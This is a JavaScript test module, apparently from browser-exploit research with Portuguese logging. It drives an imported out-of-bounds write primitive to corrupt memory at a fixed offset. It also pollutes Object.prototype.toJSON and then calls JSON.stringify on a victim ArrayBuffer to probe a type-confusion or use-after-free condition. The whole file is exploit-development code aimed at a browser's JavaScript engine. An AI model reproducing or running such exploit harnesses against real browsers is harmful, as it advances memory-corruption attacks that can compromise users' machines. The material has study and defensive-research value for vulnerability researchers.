// js/script3/testJsonTypeConfusionUAFSpeculative.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real, oob_dataview_real,
    oob_write_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

const FOCUSED_TEST_PARAMS = {
    victim_ab_size: 64,
    corruption_offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, // 0x70
    value_to_write: 0xFFFFFFFF,
    bytes_to_write_for_corruption: 4,
    ppKeyToPollute: 'toJSON',
};

export let currentCallCount_toJSON_for_typeerror_test = 0;

export async function executeTypeErrorInvestigationTest(
    testVariantDescription,
    applyPrototypePollution, // true ou false
    toJSONFunctionToUse // A função para poluir, se applyPrototypePollution for true
) {
    const FNAME_TEST = `executeTypeErrorInvestigation<${testVariantDescription}>`;
    const {
        victim_ab_size,
        corruption_offset,
        value_to_write,
        bytes_to_write_for_corruption,
        ppKeyToPollute,
    } = FOCUSED_TEST_PARAMS;

    logS3(`--- Iniciando Teste de Investigação TypeError: ${testVariantDescription} ---`, "test", FNAME_TEST);
    logS3(`   Offset: ${toHex(corruption_offset)}, Valor: ${toHex(value_to_write)}, Aplicar PP: ${applyPrototypePollution}`, "info", FNAME_TEST);
    document.title = `Iniciando: ${testVariantDescription}`;

    currentCallCount_toJSON_for_typeerror_test = 0; 

    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha ao configurar ambiente OOB. Abortando.", "error", FNAME_TEST);
        document.title = "ERRO: Falha OOB Setup";
        return { errorOccurred: true, calls: currentCallCount_toJSON_for_typeerror_test };
    }
    document.title = "OOB Configurado";

    let victim_ab = new ArrayBuffer(victim_ab_size);
    logS3(`ArrayBuffer vítima (${victim_ab_size} bytes) recriado.`, "info", FNAME_TEST);

    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKeyToPollute);
    let pollutionAppliedThisRun = false;
    let stepReached = "antes_pp_check";
    let errorOccurred = false;

    try {
        if (applyPrototypePollution) {
            logS3(`Tentando poluir Object.prototype.${ppKeyToPollute} com lógica: ${testVariantDescription}`, "info", FNAME_TEST);
            document.title = `Aplicando PP: ${testVariantDescription}`;
            stepReached = "aplicando_pp";

            Object.defineProperty(Object.prototype, ppKeyToPollute, {
                value: toJSONFunctionToUse, // Usa a lógica fornecida
                writable: true, configurable: true, enumerable: false
            });
            pollutionAppliedThisRun = true;
            logS3(`Object.prototype.${ppKeyToPollute} poluído.`, "good", FNAME_TEST);
            stepReached = "pp_aplicada";
            document.title = `PP Aplicada: ${testVariantDescription}`;
        } else {
            logS3(`Poluição de Protótipo DESABILITADA para: ${testVariantDescription}`, "info", FNAME_TEST);
            stepReached = "pp_desabilitada";
            document.title = `PP Desabilitada: ${testVariantDescription}`;
        }

        logS3(`CORRUPÇÃO: Escrevendo valor ${toHex(value_to_write)} (${bytes_to_write_for_corruption} bytes) em offset abs ${toHex(corruption_offset)}`, "warn", FNAME_TEST);
        stepReached = "antes_escrita_oob";
        document.title = `Antes Escrita OOB: ${testVariantDescription}`;
        oob_write_absolute(corruption_offset, value_to_write, bytes_to_write_for_corruption);
        logS3("Escrita OOB realizada.", "info", FNAME_TEST);
        stepReached = "apos_escrita_oob";
        document.title = `Após Escrita OOB: ${testVariantDescription}`;
        
        await PAUSE_S3(SHORT_PAUSE_S3); 

        stepReached = "antes_stringify";
        document.title = `Antes Stringify: ${testVariantDescription}`;
        logS3(`Chamando JSON.stringify(victim_ab)...`, "info", FNAME_TEST);
        let stringifyResult = null;
        try {
            stringifyResult = JSON.stringify(victim_ab); 
            stepReached = "apos_stringify";
            document.title = `Stringify Retornou: ${testVariantDescription}`;
            logS3(`Resultado de JSON.stringify(victim_ab): ${String(stringifyResult).substring(0, 300)}`, "info", FNAME_TEST);
        } catch (e) {
            stepReached = "erro_stringify";
            document.title = `ERRO Stringify (${e.name}): ${testVariantDescription}`;
            errorOccurred = true;
            logS3(`ERRO CAPTURADO durante JSON.stringify(victim_ab): ${e.name} - ${e.message}.`, "critical", FNAME_TEST);
            console.error(`JSON.stringify Test Error (${testVariantDescription}):`, e);
        }

    } catch (mainError) {
        stepReached = "erro_principal";
        document.title = `ERRO Principal: ${testVariantDescription}`;
        errorOccurred = true;
        logS3(`Erro principal no teste (${testVariantDescription}): ${mainError.message}`, "error", FNAME_TEST);
        console.error(mainError);
    } finally {
        if (pollutionAppliedThisRun) {
            // Restaurar apenas se foi poluído nesta execução
            if (originalToJSONDescriptor) {
                Object.defineProperty(Object.prototype, ppKeyToPollute, originalToJSONDescriptor);
            } else {
                delete Object.prototype[ppKeyToPollute];
            }
            logS3(`Object.prototype.${ppKeyToPollute} restaurado para ${testVariantDescription}.`, "info");
        }
        clearOOBEnvironment();
        logS3(`Ambiente OOB Limpo. Último passo alcançado: ${stepReached}`, "info", FNAME_TEST);
    }
    logS3(`--- Teste de Investigação TypeError Concluído: ${testVariantDescription} (Chamadas toJSON: ${currentCallCount_toJSON_for_typeerror_test}) ---`, "test", FNAME_TEST);
    if (!errorOccurred && stepReached === "apos_stringify") { // Se completou sem erro explícito
        document.title = `Teste OK: ${testVariantDescription}`;
    }
    return { errorOccurred, calls: currentCallCount_toJSON_for_typeerror_test };
}
